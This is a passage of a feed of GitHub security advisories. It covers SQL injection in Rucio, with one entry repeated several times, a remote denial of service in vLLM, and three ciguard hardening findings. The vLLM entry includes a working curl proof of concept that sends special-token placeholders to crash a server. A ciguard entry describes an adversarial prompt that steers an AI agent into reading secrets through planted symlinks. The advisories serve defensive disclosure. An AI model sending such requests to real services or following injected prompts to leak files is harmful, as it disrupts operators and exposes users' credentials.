<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li>Rucio deployments that have explicitly configured the <code>postgres_meta</code> metadata plugin.</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Data modification:</strong> PostgreSQL stacked queries enable arbitrary <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations.</li>
<li><strong>Remote code execution:</strong> Via PostgreSQL's <code>COPY ... FROM PROGRAM</code> if the database user has superuser or <code>pg_execute_server_program</code> privileges.</li>
<li><strong>File system access:</strong> Via <code>COPY ... TO/FROM '/path'</code> if filesystem permissions allow.</li>
</ul>
<p><strong>Further elevation when the same postgres database and access is used for metadata and for Rucio itself</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies) could be extracted.</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947">https://github.com/rucio/rucio/security/advisories/GHSA-6j7p-qjhg-9947</a></li>
<li><a href="https://github.com/advisories/GHSA-6j7p-qjhg-9947">https://github.com/advisories/GHSA-6j7p-qjhg-9947</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j7p-qjhg-9947</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:44:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine Oracle JSON Path via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</id>
        <link href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3"/>
        <updated>2026-05-06T16:42:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in the Oracle path of <code>FilterEngine.create_sqla_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the backend database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). Attacker-controlled filter keys and values are interpolated directly into <code>sqlalchemy.text</code> via Python <code>str.format</code>, completely bypassing parameterization. This enables full database compromise including extraction of authentication tokens, password hashes, and all managed data identifiers. The vulnerability is affecting deployments using the default metadata plugin configuration <code>json_meta</code> with Oracle database backends.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li><strong>All Oracle-based Rucio deployments</strong> using the default metadata plugin configuration (<code>json_meta</code>).</li>
<li><em><strong>Not affected</strong></em> are PostgreSQL/MySQL deployments using the default <code>json_meta</code> plugin (SQLAlchemy parameterizes the JSON path operations via bind parameters on non-Oracle dialects).</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies).</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
<li><strong>Data modification:</strong> Oracle PL/SQL enables <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations via DML within subqueries and PL/SQL blocks.</li>
<li><strong>Potential remote code execution:</strong> Via Oracle's <code>UTL_HTTP</code>, <code>DBMS_SCHEDULER</code>, or Java stored procedures if the database user has elevated privileges.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
<li><a href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:42:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine Oracle JSON Path via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</id>
        <link href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3"/>
        <updated>2026-05-06T16:42:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in the Oracle path of <code>FilterEngine.create_sqla_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the backend database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). Attacker-controlled filter keys and values are interpolated directly into <code>sqlalchemy.text</code> via Python <code>str.format</code>, completely bypassing parameterization. This enables full database compromise including extraction of authentication tokens, password hashes, and all managed data identifiers. The vulnerability is affecting deployments using the default metadata plugin configuration <code>json_meta</code> with Oracle database backends.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li><strong>All Oracle-based Rucio deployments</strong> using the default metadata plugin configuration (<code>json_meta</code>).</li>
<li><em><strong>Not affected</strong></em> are PostgreSQL/MySQL deployments using the default <code>json_meta</code> plugin (SQLAlchemy parameterizes the JSON path operations via bind parameters on non-Oracle dialects).</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies).</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
<li><strong>Data modification:</strong> Oracle PL/SQL enables <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations via DML within subqueries and PL/SQL blocks.</li>
<li><strong>Potential remote code execution:</strong> Via Oracle's <code>UTL_HTTP</code>, <code>DBMS_SCHEDULER</code>, or Java stored procedures if the database user has elevated privileges.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
<li><a href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:42:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine Oracle JSON Path via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</id>
        <link href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3"/>
        <updated>2026-05-06T16:42:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in the Oracle path of <code>FilterEngine.create_sqla_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the backend database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). Attacker-controlled filter keys and values are interpolated directly into <code>sqlalchemy.text</code> via Python <code>str.format</code>, completely bypassing parameterization. This enables full database compromise including extraction of authentication tokens, password hashes, and all managed data identifiers. The vulnerability is affecting deployments using the default metadata plugin configuration <code>json_meta</code> with Oracle database backends.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li><strong>All Oracle-based Rucio deployments</strong> using the default metadata plugin configuration (<code>json_meta</code>).</li>
<li><em><strong>Not affected</strong></em> are PostgreSQL/MySQL deployments using the default <code>json_meta</code> plugin (SQLAlchemy parameterizes the JSON path operations via bind parameters on non-Oracle dialects).</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies).</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
<li><strong>Data modification:</strong> Oracle PL/SQL enables <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations via DML within subqueries and PL/SQL blocks.</li>
<li><strong>Potential remote code execution:</strong> Via Oracle's <code>UTL_HTTP</code>, <code>DBMS_SCHEDULER</code>, or Java stored procedures if the database user has elevated privileges.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
<li><a href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:42:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rucio] Rucio has SQL Injection in FilterEngine Oracle JSON Path via DID Search API]]></title>
        <id>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</id>
        <link href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3"/>
        <updated>2026-05-06T16:42:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A SQL injection vulnerability in the Oracle path of <code>FilterEngine.create_sqla_query</code> allows any authenticated Rucio user to execute arbitrary SQL against the backend database through the DID search endpoint (<code>GET /dids/&lt;scope&gt;/dids/search</code>). Attacker-controlled filter keys and values are interpolated directly into <code>sqlalchemy.text</code> via Python <code>str.format</code>, completely bypassing parameterization. This enables full database compromise including extraction of authentication tokens, password hashes, and all managed data identifiers. The vulnerability is affecting deployments using the default metadata plugin configuration <code>json_meta</code> with Oracle database backends.</p>
<h3 id="details">Details</h3>
<p><em>Will follow in two weeks (2025-05-19).</em></p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> SQL Injection (CWE-89)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li><strong>All Oracle-based Rucio deployments</strong> using the default metadata plugin configuration (<code>json_meta</code>).</li>
<li><em><strong>Not affected</strong></em> are PostgreSQL/MySQL deployments using the default <code>json_meta</code> plugin (SQLAlchemy parameterizes the JSON path operations via bind parameters on non-Oracle dialects).</li>
</ul>
<p><strong>What an attacker can do:</strong></p>
<ul>
<li><strong>Full database read access:</strong> Extract any table including <code>identities</code> (password hashes and salts), <code>tokens</code> (active authentication sessions), <code>accounts</code> (user enumeration), <code>rse_settings</code> (storage endpoint credentials), and <code>rules</code> (data management policies).</li>
<li><strong>Password hash extraction:</strong> Combined with Rucio's use of single-iteration SHA-256 for password hashing (no KDF), extracted hashes can be cracked at GPU speed.</li>
<li><strong>Authentication token theft:</strong> Active bearer tokens can be extracted and used for immediate session hijacking.</li>
<li><strong>Data modification:</strong> Oracle PL/SQL enables <code>INSERT</code>/<code>UPDATE</code>/<code>DELETE</code> operations via DML within subqueries and PL/SQL blocks.</li>
<li><strong>Potential remote code execution:</strong> Via Oracle's <code>UTL_HTTP</code>, <code>DBMS_SCHEDULER</code>, or Java stored procedures if the database user has elevated privileges.</li>
</ul>
<p><strong>Required attacker privileges:</strong> Any authenticated Rucio user. Authentication tokens can be obtained via any supported method (userpass, x509, OIDC, SAML, SSH, GSS). No special roles or administrative permissions are required. The <code>GET /dids/&lt;scope&gt;/dids/search</code> endpoint is available to all authenticated users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/rucio/rucio/security/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
<li><a href="https://github.com/advisories/GHSA-vjr5-c9qv-hgm3">https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vjr5-c9qv-hgm3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-06T16:42:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM Vulnerable to Remote DoS via Special-Token Placeholders]]></title>
        <id>https://github.com/advisories/GHSA-hpv8-x276-m59f</id>
        <link href="https://github.com/advisories/GHSA-hpv8-x276-m59f"/>
        <updated>2026-05-05T22:21:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>This report explains a Token Injection vulnerability in vLLM’s multimodal processing. Unauthenticated, text-only prompts that spell special tokens are interpreted as control. Image and video placeholder sequences supplied without matching data cause vLLM to index into empty grids during input-position computation, raising an unhandled IndexError and terminating the worker or degrading availability. Multimodal paths that rely on <code>image_grid_thw</code>/<code>video_grid_thw</code> are affected. Severity: High (remote DoS). Reproduced on vLLM 0.10.0 with Qwen2.5-VL.</p>
<h2 id="details">Details</h2>
<ul>
<li>Affected component: multimodal input position computation.</li>
<li>File/functions (paths are indicative):<ul>
<li>vllm/model_executor/layers/rotary_embedding.py<ul>
<li>get_input_positions_tensor(...)</li>
<li>_vl_get_input_positions_tensor(...)</li>
</ul>
</li>
</ul>
</li>
<li>Failure mechanism:<ul>
<li>The code counts detected vision tokens and then indexes video_grid_thw/image_grid_thw accordingly.</li>
<li>When user input carries placeholder tokens but no actual multimodal payload, these grids are empty. The code does not bounds-check before indexing.</li>
</ul>
</li>
</ul>
<p>Representative snippet (context):</p>
<pre><code class="language-python"># vllm/model_executor/layers/rotary_embedding.py
@classmethod
def _vl_get_input_positions_tensor(
    cls,
    input_tokens,
    hf_config,
    image_grid_thw,
    video_grid_thw,
    ...,
):
    # detect video tokens
    video_nums = (vision_tokens == video_token_id).sum()
    # later in processing
    t, h, w = (
        video_grid_thw[video_index][0],  # IndexError if no video data
        video_grid_thw[video_index][1],
        video_grid_thw[video_index][2],
    )
</code></pre>
<p>Abbreviated call path:</p>
<pre><code>OpenAI API request
 → vllm.v1.engine.core: step/execute_model
 → vllm.v1.worker.gpu_model_runner: _update_states/execute_model
 → vllm.model_executor.layers.rotary_embedding: get_input_positions_tensor
 → _vl_get_input_positions_tensor
 → IndexError: list index out of range
</code></pre>
<h2 id="poc">PoC</h2>
<h3 id="environment">Environment</h3>
<ul>
<li>vLLM: 0.10.0</li>
<li>Model: Qwen/Qwen2.5-VL-3B-Instruct</li>
<li>Launch server:</li>
</ul>
<pre><code class="language-bash">python -m vllm.entrypoints.openai.api_server \
  --model Qwen/Qwen2.5-VL-3B-Instruct \
  --port 8000
</code></pre>
<h3 id="request-text-only-no-imagevideo-data">Request (text-only, no image/video data)</h3>
<pre><code class="language-bash">cat &gt; request.json &lt;&lt;'JSON'
{
  "model": "Qwen/Qwen2.5-VL-3B-Instruct",
  "messages": [
    {
      "role": "user",
      "content": [
        { "type": "text",
          "text": "what's in picture &lt;|vision_start|&gt;&lt;|image_pad|&gt;&lt;|vision_end|&gt;" }
      ]
    }
  ]
}
JSON

curl -s http://127.0.0.1:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  --data @request.json
</code></pre>
<h3 id="observed-result">Observed result</h3>
<ul>
<li>HTTP 500; logs show IndexError: list index out of range from _vl_get_input_positions_tensor(...).</li>
<li>In some deployments, the worker exits and capacity remains reduced until manual restart.</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li>Type: Token Injection leading to Remote Denial of Service (unauthenticated). A single request can trigger the fault.</li>
<li>Scope: Any vLLM deployment that serves VLMs and accepts raw user text via OpenAI-compatible endpoints (self-hosted or proxied/managed fronts).</li>
<li>Effect: Request → unhandled exception in position computation → worker termination / service unavailability.</li>
</ul>
<h2 id="fixes">Fixes</h2>
<ul>
<li>Changes associated with <a href="https://github.com/vllm-project/vllm/issues/32656">https://github.com/vllm-project/vllm/issues/32656</a></li>
</ul>
<h2 id="credits">Credits</h2>
<p>Pengyu Ding (Infra Security, Ant Group)<br>Ziteng Xu (Infra Security, Ant Group)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hpv8-x276-m59f">https://github.com/vllm-project/vllm/security/advisories/GHSA-hpv8-x276-m59f</a></li>
<li><a href="https://github.com/vllm-project/vllm/issues/32656">https://github.com/vllm-project/vllm/issues/32656</a></li>
<li><a href="https://github.com/advisories/GHSA-hpv8-x276-m59f">https://github.com/advisories/GHSA-hpv8-x276-m59f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hpv8-x276-m59f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T22:21:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ciguard] ciguard: Web UI is missing HTTP defence-in-depth headers]]></title>
        <id>https://github.com/advisories/GHSA-7ww3-xvf5-cxwm</id>
        <link href="https://github.com/advisories/GHSA-7ww3-xvf5-cxwm"/>
        <updated>2026-05-05T22:20:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>ciguard's FastAPI Web UI (<code>src/ciguard/web/app.py</code>) does not set HTTP defence-in-depth headers. OWASP ZAP baseline scan flagged 11 alerts: missing Content-Security-Policy (Medium), X-Frame-Options (Medium), Sub-Resource-Integrity on <code>/api/docs</code> (Medium), COOP / COEP / CORP (Low), Permissions-Policy (Low), X-Content-Type-Options (Low).</p>
<h2 id="threat-scenario">Threat scenario</h2>
<p>For local-only deployment (current intent): minimal — there's no untrusted browser context, no third-party hosting, no auth surface to protect.</p>
<p>For public hosting (PRD Slice 9 GitHub App or hosted dashboard, future): each missing header reduces a defence layer:</p>
<ul>
<li>Missing CSP → injected XSS would have no second-line defence (first-line Jinja autoescape remains intact)</li>
<li>Missing X-Frame-Options → clickjacking against any UI button would be possible</li>
<li>Missing SRI on jsdelivr-hosted Swagger UI → if jsdelivr were compromised, attacker JS would run in the docs page context</li>
</ul>
<h2 id="patch">Patch</h2>
<ul>
<li>New <code>SecurityHeadersMiddleware</code> at <code>src/ciguard/web/security_headers.py</code> injecting: X-Content-Type-Options nosniff, X-Frame-Options DENY, Referrer-Policy no-referrer, Permissions-Policy <code>interest-cohort=()</code>, Cross-Origin-Opener-Policy same-origin, Cross-Origin-Resource-Policy same-origin, plus per-path CSP with <code>/api/docs</code> + <code>/api/redoc</code> carve-out for cdn.jsdelivr.net (Swagger UI / ReDoc dependency).</li>
<li>COEP intentionally NOT set: would break Swagger UI's cross-origin assets, and ciguard makes no SharedArrayBuffer use that would benefit.</li>
<li>Registered via <code>app.add_middleware(SecurityHeadersMiddleware)</code>.</li>
<li>6 regression tests in <code>tests/test_web.py::TestSecurityHeaders</code>.</li>
</ul>
<h2 id="discovery">Discovery</h2>
<p>Found by OWASP ZAP baseline scan during ciguard's first self-conducted pentest cycle, 2026-04-26.</p>
<h2 id="cvss-scoring">CVSS Scoring</h2>
<ul>
<li>CVSS v3.1: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N</code> — 4.3 (Medium per v3.1 thresholds)</li>
<li>CVSS v4.0: <code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code> — first.org calc 4.3 (Low); GitHub's calc 2.1 (Low). All consistent at Low/borderline.</li>
</ul>
<h2 id="verification">Verification</h2>
<pre><code>$ curl -sI http://127.0.0.1:8080/ | grep -E '^(X-Frame|X-Content|Referrer|Permissions|Cross-Origin|Content-Security):'
# Pre-fix: empty
# Post-fix: 7 headers present
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li>Fix released in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">v0.8.2</a></li>
<li>CI regression gate added in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">v0.8.3</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-7ww3-xvf5-cxwm">https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-7ww3-xvf5-cxwm</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-7ww3-xvf5-cxwm">https://github.com/advisories/GHSA-7ww3-xvf5-cxwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7ww3-xvf5-cxwm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-05T22:20:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ciguard] ciguard: discover_pipeline_files follows symlinks out of scan root]]></title>
        <id>https://github.com/advisories/GHSA-8cxw-cc62-q28v</id>
        <link href="https://github.com/advisories/GHSA-8cxw-cc62-q28v"/>
        <updated>2026-05-05T22:19:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>discover_pipeline_files()</code> function in <code>src/ciguard/discovery.py</code> (introduced in v0.8.0 and used by the MCP <code>scan_repo</code> tool shipped in v0.8.1) walks a directory tree following symlinks, with cycle protection via tracking visited resolved paths. An attacker who can plant a symlink in a directory the user (or AI agent) scans can cause discovery to walk into the symlink target and return paths to pipeline-shaped files outside the requested root.</p>
<h2 id="threat-scenario">Threat scenario</h2>
<p><strong>MCP confused-deputy.</strong> A user runs Claude Desktop / Claude Code / Cursor with the ciguard MCP server registered. The agent is fed an adversarial prompt to scan a directory containing planted symlinks (e.g. via a malicious clone or extracted tarball). <code>ciguard.scan_repo</code> walks the symlinks, returning paths and (via subsequent <code>scan</code> calls) file content from <code>~/.aws/</code>, <code>~/.config/</code>, <code>/etc/some-pipeline-config/</code>, etc. Pipeline files often contain hardcoded secrets, internal hostnames, deploy keys.</p>
<h2 id="patch">Patch</h2>
<ul>
<li>New <code>follow_symlinks: bool = False</code> parameter on <code>discover_pipeline_files</code>. Default refuses to descend into symlinked directories OR symlinked files.</li>
<li>Belt-and-braces: results are filtered to those whose <code>.resolve()</code> lies under <code>root.resolve()</code>, applied even when callers opt in to <code>follow_symlinks=True</code>.</li>
<li>3 regression tests in <code>tests/test_discovery.py::TestSymlinkSafety</code>.</li>
</ul>
<h2 id="discovery">Discovery</h2>
<p>Found during ciguard's first self-conducted penetration test cycle (PTES + OWASP TG v4.2 + CREST framing), 2026-04-26.</p>
<h2 id="cvss-scoring">CVSS Scoring</h2>
<ul>
<li>CVSS v3.1: <code>CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N</code> — 4.4 (Medium)</li>
<li>CVSS v4.0: <code>CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N</code> — first.org calc 5.7 (Medium); GitHub's calc returns 2.4 (Low). Vector is correct — calculator profiles differ.</li>
</ul>
<h2 id="reproduction">Reproduction</h2>
<pre><code class="language-python">from pathlib import Path
from ciguard.discovery import discover_pipeline_files
# In a victim dir, plant: trojan -&gt; /etc
# (or any other accessible dir containing pipeline-shaped files)
for f in discover_pipeline_files(Path('/tmp/victim')):
    print(f)  # pre-fix: includes paths under /etc; post-fix: only /tmp/victim/
</code></pre>
<h2 id="references">References</h2>
<ul>
<li>Fix released in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">v0.8.2</a></li>
<li>CI regression gate added in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">v0.8.3</a></li>
</ul>
<p>See also: <a href="https://github.com/advisories/GHSA-w828-4qhx-vxx3">GHSA-w828-4qhx-vxx3</a> — same conceptual pattern (path-validation flaw in an AI-agent tool) in Claude SDK for Python, CWE-59 + CWE-367</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-8cxw-cc62-q28v">https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-8cxw-cc62-q28v</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-8cxw-cc62-q28v">https://github.com/advisories/GHSA-8cxw-cc62-q28v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cxw-cc62-q28v</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-05T22:19:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ciguard] ciguard: Container image runs as root (no USER directive)]]></title>
        <id>https://github.com/advisories/GHSA-jrm4-4pcf-4763</id>
        <link href="https://github.com/advisories/GHSA-jrm4-4pcf-4763"/>
        <updated>2026-05-05T22:18:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The published <code>ghcr.io/jo-jo98/ciguard</code> container image inherits the default root user because the <code>Dockerfile</code> lacks a <code>USER</code> directive. ciguard is a static analyser with no need for root privileges; running as root inside a container makes any future container-runtime escape CVE more impactful than it needs to be.</p>
<h2 id="threat-scenario">Threat scenario</h2>
<p>Defence-in-depth gap. Without a known container-runtime CVE in the chain, this finding is not directly exploitable. Recent runc CVEs (e.g. CVE-2024-21626) provided escape primitives that depended on host UID = container UID = 0 for full impact; with this fix, any future such escape primitive lands as a non-root user on the host.</p>
<h2 id="patch">Patch</h2>
<ul>
<li>Dockerfile adds <code>RUN groupadd -r ciguard &amp;&amp; useradd -r -g ciguard -d /home/ciguard -m -s /usr/sbin/nologin ciguard &amp;&amp; chown -R ciguard:ciguard /reports /policies-mount /app</code>.</li>
<li>Followed by <code>USER ciguard</code> before the <code>CMD</code> directive.</li>
<li>Trivy DS-0002 misconfig clears (<code>Tests: 20 SUCCESSES: 20 FAILURES: 0</code>).</li>
</ul>
<h2 id="discovery">Discovery</h2>
<p>Found by Trivy filesystem scan during ciguard's first self-conducted pentest cycle, 2026-04-26.</p>
<h2 id="cvss-scoring">CVSS Scoring</h2>
<ul>
<li>CVSS v3.1: <code>CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:N</code> — 2.0 (Low)</li>
